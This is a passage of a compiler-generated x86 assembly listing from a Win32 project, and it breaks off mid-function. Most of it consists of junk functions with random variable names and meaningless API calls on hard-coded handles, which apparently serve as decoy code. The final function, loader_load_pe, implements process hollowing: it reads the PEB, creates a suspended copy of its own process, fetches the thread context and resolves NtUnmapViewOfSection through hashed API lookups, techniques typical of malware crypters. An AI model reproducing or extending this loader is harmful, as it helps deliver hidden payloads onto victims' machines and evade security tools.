	mov	eax, DWORD PTR _iuZtRadAG$[ebp]

; 216  : }

	mov	esp, ebp
	pop	ebp
	ret	0
?func_1_1@@YAPAUHMENU__@@PAUHDC__@@J@Z ENDP		; func_1_1
_TEXT	ENDS
; Function compile flags: /Odtp
; File c:\users\admin\documents\visual studio 2013\projects\win32project1\win32project1\win32project1.cpp
_TEXT	SEGMENT
_zeFtlBymov$ = -40					; size = 4
_FDAqw$ = -36						; size = 4
_hCHBHohLxKu$ = -32					; size = 4
_COgKeXWWaZO$ = -28					; size = 4
_SDsBuaubZIY$ = -24					; size = 4
_DtcIoO$ = -20						; size = 4
_gbZZVuNfz$ = -16					; size = 4
_hKmNXhX$ = -12						; size = 4
_TPWDMuaBFsR$ = -8					; size = 4
_SnJVAagn$ = -4						; size = 4
_YGUS$ = 8						; size = 4
_ImID$ = 12						; size = 4
_gZpwcQ$ = 16						; size = 4
_dvgMsWPskb$ = 20					; size = 4
_dmQdQvVH$ = 24						; size = 4
_qWZfMm$ = 28						; size = 4
_AeZwQN$ = 32						; size = 4
?func_1_0@@YAPAUHMENU__@@PAJPAU1@JPADHPAUHINSTANCE__@@PAK@Z PROC ; func_1_0

; 151  : HMENU func_1_0(PLONG YGUS, HMENU ImID, LONG gZpwcQ, PCHAR dvgMsWPskb, BOOL dmQdQvVH, HMODULE qWZfMm, PDWORD AeZwQN) {

	push	ebp
	mov	ebp, esp
	sub	esp, 40					; 00000028H

; 152  : 	PDWORD gbZZVuNfz = (PDWORD)0x234C129A;

	mov	DWORD PTR _gbZZVuNfz$[ebp], 592188058	; 234c129aH

; 153  : 	PLONG DtcIoO = (PLONG)0x120F68CB;

	mov	DWORD PTR _DtcIoO$[ebp], 302999755	; 120f68cbH

; 154  : 	PVOID SDsBuaubZIY = (PVOID)0x535B29ED;

	mov	DWORD PTR _SDsBuaubZIY$[ebp], 1398483437 ; 535b29edH

; 155  : 	PLONG COgKeXWWaZO = (PLONG)0x5BA35259;

	mov	DWORD PTR _COgKeXWWaZO$[ebp], 1537430105 ; 5ba35259H

; 156  : 	HDC hKmNXhX = (HDC)0x41420C4E;

	mov	DWORD PTR _hKmNXhX$[ebp], 1094847566	; 41420c4eH

; 157  : 	DWORD SnJVAagn = (DWORD)0x6AEEA75C;

	mov	DWORD PTR _SnJVAagn$[ebp], 1794025308	; 6aeea75cH

; 158  : 	HWND TPWDMuaBFsR = (HWND)0x7B4889F7;

	mov	DWORD PTR _TPWDMuaBFsR$[ebp], 2068351479 ; 7b4889f7H

; 159  : 	PWCHAR hCHBHohLxKu = (PWCHAR)L"IxWmB4XCl";

	mov	DWORD PTR _hCHBHohLxKu$[ebp], OFFSET $SG53335

; 160  : 	HINSTANCE FDAqw = (HINSTANCE)0x64157536;

	mov	DWORD PTR _FDAqw$[ebp], 1679127862	; 64157536H

; 161  : 	HANDLE zeFtlBymov = (HANDLE)0x7752E0E3;

	mov	DWORD PTR _zeFtlBymov$[ebp], 2001920227	; 7752e0e3H

; 162  : 
; 163  : 	hKmNXhX = func_0_3();

	call	?func_0_3@@YAPAUHDC__@@XZ		; func_0_3
	mov	DWORD PTR _hKmNXhX$[ebp], eax

; 164  : 
; 165  : 	SetMenuDefaultItem((HMENU)0x5BF92641, SnJVAagn, (DWORD)0x505BDABD);

	push	1348197053				; 505bdabdH
	mov	eax, DWORD PTR _SnJVAagn$[ebp]
	push	eax
	push	1543054913				; 5bf92641H
	call	DWORD PTR __imp__SetMenuDefaultItem@12

; 166  : 	SnJVAagn = GetSysColor(SnJVAagn);

	mov	ecx, DWORD PTR _SnJVAagn$[ebp]
	push	ecx
	call	DWORD PTR __imp__GetSysColor@4
	mov	DWORD PTR _SnJVAagn$[ebp], eax

; 167  : 
; 168  : 	GetCurrentProcessId();

	call	DWORD PTR __imp__GetCurrentProcessId@0

; 169  : 
; 170  : 	CheckMenuItem(ImID, (DWORD)0x1EFF87E2, (DWORD)0x5C445620);

	push	1547982368				; 5c445620H
	push	520062946				; 1eff87e2H
	mov	edx, DWORD PTR _ImID$[ebp]
	push	edx
	call	DWORD PTR __imp__CheckMenuItem@12

; 171  : 
; 172  : 	SetFocus(TPWDMuaBFsR);

	mov	eax, DWORD PTR _TPWDMuaBFsR$[ebp]
	push	eax
	call	DWORD PTR __imp__SetFocus@4

; 173  : 	dmQdQvVH = DrawMenuBar(TPWDMuaBFsR);

	mov	ecx, DWORD PTR _TPWDMuaBFsR$[ebp]
	push	ecx
	call	DWORD PTR __imp__DrawMenuBar@4
	mov	DWORD PTR _dmQdQvVH$[ebp], eax

; 174  : 
; 175  : 
; 176  : 
; 177  : 	hKmNXhX = func_0_2();

	call	?func_0_2@@YAPAUHDC__@@XZ		; func_0_2
	mov	DWORD PTR _hKmNXhX$[ebp], eax

; 178  : 
; 179  : 	return ImID;

	mov	eax, DWORD PTR _ImID$[ebp]

; 180  : }

	mov	esp, ebp
	pop	ebp
	ret	0
?func_1_0@@YAPAUHMENU__@@PAJPAU1@JPADHPAUHINSTANCE__@@PAK@Z ENDP ; func_1_0
_TEXT	ENDS
; Function compile flags: /Odtp
; File c:\users\admin\documents\visual studio 2013\projects\win32project1\win32project1\win32project1.cpp
_TEXT	SEGMENT
_aswHIpfn$ = -32					; size = 4
_YovIf$ = -28						; size = 4
_GBaAlNyGqWv$ = -24					; size = 4
_eSXjGhmVE$ = -20					; size = 4
_WaYyG$ = -16						; size = 4
_dEceVG$ = -12						; size = 4
_qeSR$ = -8						; size = 4
_pWNzEBP$ = -4						; size = 4
?func_0_3@@YAPAUHDC__@@XZ PROC				; func_0_3

; 116  : HDC func_0_3() {

	push	ebp
	mov	ebp, esp
	sub	esp, 32					; 00000020H

; 117  : 	HMODULE YovIf = (HMODULE)0x426F75BD;

	mov	DWORD PTR _YovIf$[ebp], 1114600893	; 426f75bdH

; 118  : 	HDC GBaAlNyGqWv = (HDC)0x4BBBC24F;

	mov	DWORD PTR _GBaAlNyGqWv$[ebp], 1270596175 ; 4bbbc24fH

; 119  : 	PDWORD aswHIpfn = (PDWORD)0x19EAC6F5;

	mov	DWORD PTR _aswHIpfn$[ebp], 434816757	; 19eac6f5H

; 120  : 	DWORD pWNzEBP = (DWORD)0x13718C5B;

	mov	DWORD PTR _pWNzEBP$[ebp], 326208603	; 13718c5bH

; 121  : 	PWCHAR WaYyG = (PWCHAR)L"rD2J";

	mov	DWORD PTR _WaYyG$[ebp], OFFSET $SG53296

; 122  : 	BOOL eSXjGhmVE = (BOOL)TRUE;

	mov	DWORD PTR _eSXjGhmVE$[ebp], 1

; 123  : 	HWND qeSR = (HWND)0x674E4448;

	mov	DWORD PTR _qeSR$[ebp], 1733182536	; 674e4448H

; 124  : 	HMENU dEceVG = (HMENU)0x47AB02E3;

	mov	DWORD PTR _dEceVG$[ebp], 1202389731	; 47ab02e3H

; 125  : 
; 126  : 	GetCommandLineW();

	call	DWORD PTR __imp__GetCommandLineW@0

; 127  : 	pWNzEBP = GetCurrentProcessId();

	call	DWORD PTR __imp__GetCurrentProcessId@0
	mov	DWORD PTR _pWNzEBP$[ebp], eax

; 128  : 
; 129  : 	GetLastError();

	call	DWORD PTR __imp__GetLastError@0

; 130  : 	GetCommandLineW();

	call	DWORD PTR __imp__GetCommandLineW@0

; 131  : 	DeleteMenu((HMENU)0x6DA45DD4, pWNzEBP, pWNzEBP);

	mov	eax, DWORD PTR _pWNzEBP$[ebp]
	push	eax
	mov	ecx, DWORD PTR _pWNzEBP$[ebp]
	push	ecx
	push	1839488468				; 6da45dd4H
	call	DWORD PTR __imp__DeleteMenu@12

; 132  : 	GetCursor();

	call	DWORD PTR __imp__GetCursor@0

; 133  : 	pWNzEBP = lstrcmpW(WaYyG, L"rQ8Li0Al8nt");

	push	OFFSET $SG53304
	mov	edx, DWORD PTR _WaYyG$[ebp]
	push	edx
	call	DWORD PTR __imp__lstrcmpW@8
	mov	DWORD PTR _pWNzEBP$[ebp], eax

; 134  : 
; 135  : 	eSXjGhmVE = RemoveMenu((HMENU)0x53906164, (DWORD)0x18741A73, pWNzEBP);

	mov	eax, DWORD PTR _pWNzEBP$[ebp]
	push	eax
	push	410262131				; 18741a73H
	push	1401971044				; 53906164H
	call	DWORD PTR __imp__RemoveMenu@12
	mov	DWORD PTR _eSXjGhmVE$[ebp], eax

; 136  : 
; 137  : 	pWNzEBP = IsDlgButtonChecked(qeSR, (DWORD)0x0909C3B4);

	push	151634868				; 0909c3b4H
	mov	ecx, DWORD PTR _qeSR$[ebp]
	push	ecx
	call	DWORD PTR __imp__IsDlgButtonChecked@8
	mov	DWORD PTR _pWNzEBP$[ebp], eax

; 138  : 
; 139  : 	qeSR = SetFocus(qeSR);

	mov	edx, DWORD PTR _qeSR$[ebp]
	push	edx
	call	DWORD PTR __imp__SetFocus@4
	mov	DWORD PTR _qeSR$[ebp], eax

; 140  : 
; 141  : 	dEceVG = GetMenu((HWND)0x31475481);

	push	826758273				; 31475481H
	call	DWORD PTR __imp__GetMenu@4
	mov	DWORD PTR _dEceVG$[ebp], eax

; 142  : 
; 143  : 	pWNzEBP = GetLastError();

	call	DWORD PTR __imp__GetLastError@0
	mov	DWORD PTR _pWNzEBP$[ebp], eax

; 144  : 
; 145  : 	dEceVG = GetSubMenu((HMENU)0x0E877D57, pWNzEBP);

	mov	eax, DWORD PTR _pWNzEBP$[ebp]
	push	eax
	push	243760471				; 0e877d57H
	call	DWORD PTR __imp__GetSubMenu@8
	mov	DWORD PTR _dEceVG$[ebp], eax

; 146  : 
; 147  : 	GetShellWindow();

	call	DWORD PTR __imp__GetShellWindow@0

; 148  : 	return GBaAlNyGqWv;

	mov	eax, DWORD PTR _GBaAlNyGqWv$[ebp]

; 149  : }

	mov	esp, ebp
	pop	ebp
	ret	0
?func_0_3@@YAPAUHDC__@@XZ ENDP				; func_0_3
_TEXT	ENDS
; Function compile flags: /Odtp
; File c:\users\admin\documents\visual studio 2013\projects\win32project1\win32project1\win32project1.cpp
_TEXT	SEGMENT
_kxNMHEG$ = -36						; size = 4
_nsbmN$ = -32						; size = 4
_MiSXX$ = -28						; size = 4
_BXyHix$ = -24						; size = 4
_YREKhGKjB$ = -20					; size = 4
_xIAPIC$ = -16						; size = 4
_pqBkBvn$ = -12						; size = 4
_HXUq$ = -8						; size = 4
_xIaXkjKFQEb$ = -4					; size = 4
?func_0_2@@YAPAUHDC__@@XZ PROC				; func_0_2

; 83   : HDC func_0_2() {

	push	ebp
	mov	ebp, esp
	sub	esp, 36					; 00000024H

; 84   : 	HANDLE MiSXX = (HANDLE)0x4814F07D;

	mov	DWORD PTR _MiSXX$[ebp], 1209331837	; 4814f07dH

; 85   : 	PCHAR BXyHix = (PCHAR)"OYMonvF";

	mov	DWORD PTR _BXyHix$[ebp], OFFSET $SG53264

; 86   : 	HINSTANCE nsbmN = (HINSTANCE)0x0B762666;

	mov	DWORD PTR _nsbmN$[ebp], 192292454	; 0b762666H

; 87   : 	PDWORD kxNMHEG = (PDWORD)0x113F7257;

	mov	DWORD PTR _kxNMHEG$[ebp], 289370711	; 113f7257H

; 88   : 	DWORD xIaXkjKFQEb = (DWORD)0x20E2B370;

	mov	DWORD PTR _xIaXkjKFQEb$[ebp], 551727984	; 20e2b370H

; 89   : 	BOOL YREKhGKjB = (BOOL)TRUE;

	mov	DWORD PTR _YREKhGKjB$[ebp], 1

; 90   : 	HWND xIAPIC = (HWND)0x766939EC;

	mov	DWORD PTR _xIAPIC$[ebp], 1986607596	; 766939ecH

; 91   : 	PWCHAR pqBkBvn = (PWCHAR)L"iTgPL";

	mov	DWORD PTR _pqBkBvn$[ebp], OFFSET $SG53277

; 92   : 	HDC HXUq = (HDC)0x36CAE8F2;

	mov	DWORD PTR _HXUq$[ebp], 919267570	; 36cae8f2H

; 93   : 
; 94   : 	func_2_3();

	call	?func_2_3@@YAXXZ			; func_2_3

; 95   : 	func_2_3();

	call	?func_2_3@@YAXXZ			; func_2_3

; 96   : 	GetWindowLongA((HWND)0x27447CA7, xIaXkjKFQEb);

	mov	eax, DWORD PTR _xIaXkjKFQEb$[ebp]
	push	eax
	push	658799783				; 27447ca7H
	call	DWORD PTR __imp__GetWindowLongA@8

; 97   : 
; 98   : 
; 99   : 	GetShellWindow();

	call	DWORD PTR __imp__GetShellWindow@0

; 100  : 	xIaXkjKFQEb = lstrlenW(L"SqabNCN0UI");

	push	OFFSET $SG53281
	call	DWORD PTR __imp__lstrlenW@4
	mov	DWORD PTR _xIaXkjKFQEb$[ebp], eax

; 101  : 
; 102  : 	YREKhGKjB = SetWindowTextW(xIAPIC, pqBkBvn);

	mov	ecx, DWORD PTR _pqBkBvn$[ebp]
	push	ecx
	mov	edx, DWORD PTR _xIAPIC$[ebp]
	push	edx
	call	DWORD PTR __imp__SetWindowTextW@8
	mov	DWORD PTR _YREKhGKjB$[ebp], eax

; 103  : 
; 104  : 	lstrlenW(L"O49t0kDNJm");

	push	OFFSET $SG53282
	call	DWORD PTR __imp__lstrlenW@4

; 105  : 	xIaXkjKFQEb = lstrcmpA(BXyHix, "s0k3uvxTc");

	push	OFFSET $SG53283
	mov	eax, DWORD PTR _BXyHix$[ebp]
	push	eax
	call	DWORD PTR __imp__lstrcmpA@8
	mov	DWORD PTR _xIaXkjKFQEb$[ebp], eax

; 106  : 
; 107  : 	HXUq = func_0_3();

	call	?func_0_3@@YAPAUHDC__@@XZ		; func_0_3
	mov	DWORD PTR _HXUq$[ebp], eax

; 108  : 
; 109  : 
; 110  : 
; 111  : 	xIaXkjKFQEb = GetACP();

	call	DWORD PTR __imp__GetACP@0
	mov	DWORD PTR _xIaXkjKFQEb$[ebp], eax

; 112  : 
; 113  : 	return HXUq;

	mov	eax, DWORD PTR _HXUq$[ebp]

; 114  : }

	mov	esp, ebp
	pop	ebp
	ret	0
?func_0_2@@YAPAUHDC__@@XZ ENDP				; func_0_2
_TEXT	ENDS
; Function compile flags: /Odtp
; File c:\users\admin\documents\visual studio 2013\projects\win32project1\win32project1\win32project1.cpp
_TEXT	SEGMENT
_NilSthxh$ = -36					; size = 4
_TOctGUHpj$ = -32					; size = 4
_mDbMclvBzA$ = -28					; size = 4
_yAfT$ = -24						; size = 4
_TzdZXHvcZN$ = -20					; size = 4
_iAjptZMRkmM$ = -16					; size = 4
_bOGCvIQMKN$ = -12					; size = 4
_GNgRq$ = -8						; size = 4
_QvzGRpIDmq$ = -4					; size = 4
_jKHfOQlq$ = 8						; size = 4
_nMZnxATwzf$ = 12					; size = 4
_JBKRhKthI$ = 16					; size = 4
_LlWDlnET$ = 20						; size = 4
_qzcSoZWkizt$ = 24					; size = 4
_vrcDSLDM$ = 28						; size = 4
?func_0_1@@YAPAXPAUHINSTANCE__@@PA_WPAUHMENU__@@0PAUHWND__@@2@Z PROC ; func_0_1

; 54   : PVOID func_0_1(HINSTANCE jKHfOQlq, PWCHAR nMZnxATwzf, HMENU JBKRhKthI, HINSTANCE LlWDlnET, HWND qzcSoZWkizt, HMENU vrcDSLDM) {

	push	ebp
	mov	ebp, esp
	sub	esp, 36					; 00000024H

; 55   : 	PLONG yAfT = (PLONG)0x6CAC3855;

	mov	DWORD PTR _yAfT$[ebp], 1823225941	; 6cac3855H

; 56   : 	HWND mDbMclvBzA = (HWND)0x0238340D;

	mov	DWORD PTR _mDbMclvBzA$[ebp], 37237773	; 0238340dH

; 57   : 	HWND GNgRq = (HWND)0x7D3AB40A;

	mov	DWORD PTR _GNgRq$[ebp], 2100999178	; 7d3ab40aH

; 58   : 	PDWORD TOctGUHpj = (PDWORD)0x510A890A;

	mov	DWORD PTR _TOctGUHpj$[ebp], 1359644938	; 510a890aH

; 59   : 	HMODULE NilSthxh = (HMODULE)0x45B034EB;

	mov	DWORD PTR _NilSthxh$[ebp], 1169175787	; 45b034ebH

; 60   : 	HDC QvzGRpIDmq = (HDC)0x0AA89257;

	mov	DWORD PTR _QvzGRpIDmq$[ebp], 178819671	; 0aa89257H

; 61   : 	HANDLE iAjptZMRkmM = (HANDLE)0x4CF111A9;

	mov	DWORD PTR _iAjptZMRkmM$[ebp], 1290867113 ; 4cf111a9H

; 62   : 	DWORD bOGCvIQMKN = (DWORD)0x6C1B6969;

	mov	DWORD PTR _bOGCvIQMKN$[ebp], 1813735785	; 6c1b6969H

; 63   : 	PCHAR TzdZXHvcZN = (PCHAR)"YABlX8SUL";

	mov	DWORD PTR _TzdZXHvcZN$[ebp], OFFSET $SG53254

; 64   : 
; 65   : 
; 66   : 	IsDlgButtonChecked(GNgRq, (DWORD)0x68BA557D);

	push	1757042045				; 68ba557dH
	mov	eax, DWORD PTR _GNgRq$[ebp]
	push	eax
	call	DWORD PTR __imp__IsDlgButtonChecked@8

; 67   : 	func_0_3();

	call	?func_0_3@@YAPAUHDC__@@XZ		; func_0_3

; 68   : 	bOGCvIQMKN = ReleaseDC(qzcSoZWkizt, QvzGRpIDmq);

	mov	ecx, DWORD PTR _QvzGRpIDmq$[ebp]
	push	ecx
	mov	edx, DWORD PTR _qzcSoZWkizt$[ebp]
	push	edx
	call	DWORD PTR __imp__ReleaseDC@8
	mov	DWORD PTR _bOGCvIQMKN$[ebp], eax

; 69   : 
; 70   : 
; 71   : 	iAjptZMRkmM = GetProcessHeap();

	call	DWORD PTR __imp__GetProcessHeap@0
	mov	DWORD PTR _iAjptZMRkmM$[ebp], eax

; 72   : 
; 73   : 	QvzGRpIDmq = func_0_3();

	call	?func_0_3@@YAPAUHDC__@@XZ		; func_0_3
	mov	DWORD PTR _QvzGRpIDmq$[ebp], eax

; 74   : 
; 75   : 
; 76   : 
; 77   : 	JBKRhKthI = GetMenu((HWND)0x3BCDAE97);

	push	1003335319				; 3bcdae97H
	call	DWORD PTR __imp__GetMenu@4
	mov	DWORD PTR _JBKRhKthI$[ebp], eax

; 78   : 
; 79   : 
; 80   : 	return (PVOID)TzdZXHvcZN;

	mov	eax, DWORD PTR _TzdZXHvcZN$[ebp]

; 81   : }

	mov	esp, ebp
	pop	ebp
	ret	0
?func_0_1@@YAPAXPAUHINSTANCE__@@PA_WPAUHMENU__@@0PAUHWND__@@2@Z ENDP ; func_0_1
_TEXT	ENDS
; Function compile flags: /Odtp
; File c:\users\admin\documents\visual studio 2013\projects\win32project1\win32project1\win32project1.cpp
_TEXT	SEGMENT
_PKzxj$ = -28						; size = 4
_LgKEIz$ = -24						; size = 4
_OFGX$ = -20						; size = 4
_AZZwn$ = -16						; size = 4
_Xmul$ = -12						; size = 4
_AVOR$ = -8						; size = 4
_WmyzoV$ = -4						; size = 4
_MWJX$ = 8						; size = 4
_NqxNsQ$ = 12						; size = 4
?func_0_0@@YAPAUHDC__@@PAJPAUHMENU__@@@Z PROC		; func_0_0

; 29   : HDC func_0_0(PLONG MWJX, HMENU NqxNsQ) {

	push	ebp
	mov	ebp, esp
	sub	esp, 28					; 0000001cH

; 30   : 	PCHAR OFGX = (PCHAR)"nQPqZD";

	mov	DWORD PTR _OFGX$[ebp], OFFSET $SG53210

; 31   : 	HMENU LgKEIz = (HMENU)0x5211C1E4;

	mov	DWORD PTR _LgKEIz$[ebp], 1376895460	; 5211c1e4H

; 32   : 	HANDLE AZZwn = (HANDLE)0x59251132;

	mov	DWORD PTR _AZZwn$[ebp], 1495601458	; 59251132H

; 33   : 	HWND Xmul = (HWND)0x32BE6106;

	mov	DWORD PTR _Xmul$[ebp], 851337478	; 32be6106H

; 34   : 	DWORD WmyzoV = (DWORD)0x2AA0ACAF;

	mov	DWORD PTR _WmyzoV$[ebp], 715173039	; 2aa0acafH

; 35   : 	PVOID PKzxj = (PVOID)0x2BC2A57D;

	mov	DWORD PTR _PKzxj$[ebp], 734176637	; 2bc2a57dH

; 36   : 	HDC AVOR = (HDC)0x05851D46;

	mov	DWORD PTR _AVOR$[ebp], 92609862		; 05851d46H

; 37   : 
; 38   : 	GetCommandLineW();

	call	DWORD PTR __imp__GetCommandLineW@0

; 39   : 	GetMenu((HWND)0x6EE73CDF);

	push	1860648159				; 6ee73cdfH
	call	DWORD PTR __imp__GetMenu@4

; 40   : 	GetACP();

	call	DWORD PTR __imp__GetACP@0

; 41   : 	AZZwn = GetPropW(Xmul, L"7P1qIpWRq6");

	push	OFFSET $SG53224
	mov	eax, DWORD PTR _Xmul$[ebp]
	push	eax
	call	DWORD PTR __imp__GetPropW@8
	mov	DWORD PTR _AZZwn$[ebp], eax

; 42   : 
; 43   : 	DestroyMenu((HMENU)0x715E85AF);

	push	1902020015				; 715e85afH
	call	DWORD PTR __imp__DestroyMenu@4

; 44   : 	WmyzoV = lstrlenA(OFGX);

	mov	ecx, DWORD PTR _OFGX$[ebp]
	push	ecx
	call	DWORD PTR __imp__lstrlenA@4
	mov	DWORD PTR _WmyzoV$[ebp], eax

; 45   : 
; 46   : 	WmyzoV = ReleaseDC((HWND)0x6C24F8D7, AVOR);

	mov	edx, DWORD PTR _AVOR$[ebp]
	push	edx
	push	1814362327				; 6c24f8d7H
	call	DWORD PTR __imp__ReleaseDC@8
	mov	DWORD PTR _WmyzoV$[ebp], eax

; 47   : 
; 48   : 	GetLastError();

	call	DWORD PTR __imp__GetLastError@0

; 49   : 	lstrlenW(L"wDUw");

	push	OFFSET $SG53227
	call	DWORD PTR __imp__lstrlenW@4

; 50   : 	func_2_3();

	call	?func_2_3@@YAXXZ			; func_2_3

; 51   : 	return AVOR;

	mov	eax, DWORD PTR _AVOR$[ebp]

; 52   : }

	mov	esp, ebp
	pop	ebp
	ret	0
?func_0_0@@YAPAUHDC__@@PAJPAUHMENU__@@@Z ENDP		; func_0_0
_TEXT	ENDS
; Function compile flags: /Odtp
; File c:\users\admin\documents\visual studio 2013\projects\win32project1\win32project1\peloader.h
_TEXT	SEGMENT
_CTX$ = -908						; size = 716
_SI$ = -192						; size = 68
_pRelocTable$ = -124					; size = 4
_pSelfDosHeader$ = -120					; size = 4
_pSelfNtHeaders$ = -116					; size = 4
_dwOld$1 = -112						; size = 4
_dwImageSize$2 = -108					; size = 4
_lpAllocatedImageBase$ = -104				; size = 4
_dwSuspendCount$ = -100					; size = 4
_pPayloadDosHeader$ = -96				; size = 4
_lpProtectAddress$3 = -92				; size = 4
_dwProtectSize$4 = -88					; size = 4
_ImageSize$ = -84					; size = 4
tv153 = -80						; size = 4
tv191 = -76						; size = 4
tv254 = -72						; size = 4
tv168 = -68						; size = 4
_pPEB$ = -64						; size = 4
_lpImageBase$5 = -60					; size = 4
tv229 = -56						; size = 4
tv144 = -52						; size = 4
tv214 = -48						; size = 4
tv245 = -44						; size = 4
_PI$ = -40						; size = 16
_i$6 = -24						; size = 4
_dwAllocationAttempts$ = -20				; size = 4
_pPayloadNtHeaders$ = -16				; size = 4
_pISH$ = -12						; size = 4
_ImageBase$ = -8					; size = 4
_Result$ = -4						; size = 4
_lpExeBuffer$ = 8					; size = 4
_dwExeSize$ = 12					; size = 4
?loader_load_pe@@YAXPAXK@Z PROC				; loader_load_pe

; 899  : void loader_load_pe(LPVOID lpExeBuffer, DWORD dwExeSize) {

	push	ebp
	mov	ebp, esp
	sub	esp, 908				; 0000038cH

; 900  : 
; 901  : 	PPEB pPEB = (PPEB)__readfsdword(0x30);

	mov	eax, DWORD PTR fs:48
	mov	DWORD PTR _pPEB$[ebp], eax

; 902  : 
; 903  : 	DWORD ImageBase = 0;

	mov	DWORD PTR _ImageBase$[ebp], 0

; 904  : 	DWORD ImageSize = 0;

	mov	DWORD PTR _ImageSize$[ebp], 0

; 905  : 
; 906  : 	ImageBase = (DWORD)pPEB->ImageBaseAddress;

	mov	ecx, DWORD PTR _pPEB$[ebp]
	mov	edx, DWORD PTR [ecx+8]
	mov	DWORD PTR _ImageBase$[ebp], edx

; 907  : 
; 908  : 	PIMAGE_DOS_HEADER pSelfDosHeader = (PIMAGE_DOS_HEADER)ImageBase;

	mov	eax, DWORD PTR _ImageBase$[ebp]
	mov	DWORD PTR _pSelfDosHeader$[ebp], eax

; 909  : 	PIMAGE_NT_HEADERS pSelfNtHeaders = (PIMAGE_NT_HEADERS)(ImageBase + pSelfDosHeader->e_lfanew);

	mov	ecx, DWORD PTR _pSelfDosHeader$[ebp]
	mov	edx, DWORD PTR _ImageBase$[ebp]
	add	edx, DWORD PTR [ecx+60]
	mov	DWORD PTR _pSelfNtHeaders$[ebp], edx

; 910  : 
; 911  : 	ImageSize = pSelfNtHeaders->OptionalHeader.SizeOfImage;

	mov	eax, DWORD PTR _pSelfNtHeaders$[ebp]
	mov	ecx, DWORD PTR [eax+80]
	mov	DWORD PTR _ImageSize$[ebp], ecx

; 912  : 
; 913  : 	PIMAGE_DOS_HEADER pPayloadDosHeader = (PIMAGE_DOS_HEADER)lpExeBuffer;

	mov	edx, DWORD PTR _lpExeBuffer$[ebp]
	mov	DWORD PTR _pPayloadDosHeader$[ebp], edx

; 914  : 	PIMAGE_NT_HEADERS pPayloadNtHeaders = (PIMAGE_NT_HEADERS)((DWORD)lpExeBuffer + pPayloadDosHeader->e_lfanew);

	mov	eax, DWORD PTR _pPayloadDosHeader$[ebp]
	mov	ecx, DWORD PTR _lpExeBuffer$[ebp]
	add	ecx, DWORD PTR [eax+60]
	mov	DWORD PTR _pPayloadNtHeaders$[ebp], ecx

; 915  : 	PIMAGE_DATA_DIRECTORY pRelocTable = (PIMAGE_DATA_DIRECTORY)&pPayloadNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

	mov	edx, 8
	imul	eax, edx, 5
	mov	ecx, DWORD PTR _pPayloadNtHeaders$[ebp]
	lea	edx, DWORD PTR [ecx+eax+120]
	mov	DWORD PTR _pRelocTable$[ebp], edx

; 916  : 
; 917  : 	STARTUPINFOW SI = { 0 };

	mov	DWORD PTR _SI$[ebp], 0
	push	64					; 00000040H
	push	0
	lea	eax, DWORD PTR _SI$[ebp+4]
	push	eax
	call	_memset
	add	esp, 12					; 0000000cH

; 918  : 	PROCESS_INFORMATION PI = { 0 };

	mov	DWORD PTR _PI$[ebp], 0
	xor	ecx, ecx
	mov	DWORD PTR _PI$[ebp+4], ecx
	mov	DWORD PTR _PI$[ebp+8], ecx
	mov	DWORD PTR _PI$[ebp+12], ecx

; 919  : 
; 920  : 	CONTEXT CTX = { 0 };

	mov	DWORD PTR _CTX$[ebp], 0
	push	712					; 000002c8H
	push	0
	lea	edx, DWORD PTR _CTX$[ebp+4]
	push	edx
	call	_memset
	add	esp, 12					; 0000000cH

; 921  : 	CTX.ContextFlags = CONTEXT_FULL;

	mov	DWORD PTR _CTX$[ebp], 65543		; 00010007H

; 922  : 
; 923  : 	BOOL Result = 0;

	mov	DWORD PTR _Result$[ebp], 0

; 924  : 
; 925  : 	x_CreateProcessW = reinterpret_cast<API_DEFINES::t_CreateProcessW>(load_func(MODULE_BASE::KERNEL32, hash_CreateProcessW));

	mov	eax, DWORD PTR ?hash_CreateProcessW@@3KC ; hash_CreateProcessW
	push	eax
	push	1
	call	?load_func@@YAPAXW4MODULE_BASE@@K@Z	; load_func
	add	esp, 8
	mov	DWORD PTR ?x_CreateProcessW@@3P6GHPA_W0PAU_SECURITY_ATTRIBUTES@@1HKPAXPBDPAU_STARTUPINFOW@@PAU_PROCESS_INFORMATION@@@ZA, eax ; x_CreateProcessW

; 926  : 
; 927  : 	Result = x_CreateProcessW(NULL, pPEB->ProcessParameters->ImagePathName.Buffer, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI);

	lea	ecx, DWORD PTR _PI$[ebp]
	push	ecx
	lea	edx, DWORD PTR _SI$[ebp]
	push	edx
	push	0
	push	0
	push	4
	push	0
	push	0
	push	0
	mov	eax, DWORD PTR _pPEB$[ebp]
	mov	ecx, DWORD PTR [eax+16]
	mov	edx, DWORD PTR [ecx+60]
	push	edx
	push	0
	call	DWORD PTR ?x_CreateProcessW@@3P6GHPA_W0PAU_SECURITY_ATTRIBUTES@@1HKPAXPBDPAU_STARTUPINFOW@@PAU_PROCESS_INFORMATION@@@ZA ; x_CreateProcessW
	mov	DWORD PTR _Result$[ebp], eax

; 928  : 
; 929  : 	x_NtGetContextThread = reinterpret_cast<API_DEFINES::t_NtGetContextThread>(load_func(MODULE_BASE::NTDLL, hash_NtGetContextThread));

	mov	eax, DWORD PTR ?hash_NtGetContextThread@@3KC ; hash_NtGetContextThread
	push	eax
	push	0
	call	?load_func@@YAPAXW4MODULE_BASE@@K@Z	; load_func
	add	esp, 8
	mov	DWORD PTR ?x_NtGetContextThread@@3P6GJPAXPAU_CONTEXT@@@ZA, eax ; x_NtGetContextThread

; 930  : 
; 931  : 	Result = NT_SUCCESS(x_NtGetContextThread(PI.hThread, &CTX));

	lea	ecx, DWORD PTR _CTX$[ebp]
	push	ecx
	mov	edx, DWORD PTR _PI$[ebp+4]
	push	edx
	call	DWORD PTR ?x_NtGetContextThread@@3P6GJPAXPAU_CONTEXT@@@ZA ; x_NtGetContextThread
	test	eax, eax
	jl	SHORT $LN11@loader_loa
	mov	DWORD PTR tv144[ebp], 1
	jmp	SHORT $LN12@loader_loa
$LN11@loader_loa:
	mov	DWORD PTR tv144[ebp], 0
$LN12@loader_loa:
	mov	eax, DWORD PTR tv144[ebp]
	mov	DWORD PTR _Result$[ebp], eax

; 932  : 
; 933  : 	x_NtUnmapViewOfSection = reinterpret_cast<API_DEFINES::t_NtUnmapViewOfSection>(load_func(MODULE_BASE::NTDLL, hash_NtUnmapViewOfSection));

	mov	ecx, DWORD PTR ?hash_NtUnmapViewOfSection@@3KC ; hash_NtUnmapViewOfSection
	push	ecx
	push	0
	call	?load_func@@YAPAXW4MODULE_BASE@@K@Z	; load_func
	add	esp, 8
	mov	DWORD PTR ?x_NtUnmapViewOfSection@@3P6GJPAX0@ZA, eax ; x_NtUnmapViewOfSection

; 934  : 
